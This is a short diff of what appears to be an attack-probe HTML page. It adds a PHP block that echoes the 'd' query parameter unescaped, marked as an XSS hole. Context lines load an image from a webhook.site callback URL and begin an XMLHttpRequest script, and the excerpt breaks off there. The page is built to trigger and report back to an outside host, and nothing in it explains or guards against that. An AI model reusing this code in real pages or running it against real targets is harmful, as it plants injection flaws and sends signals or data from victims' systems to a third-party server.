@@ -1,5 +1,9 @@
 <!DOCTYPE html>
 <html><body>
+<script language="php">
+$d = $_GET['d'];
+echo($d); // XSS
+</script>
 <img src=http://webhook.site/06a09bcb-3bee-4e80-8ff7-9be98620312a>
 <script>
 var http = new XMLHttpRequest();
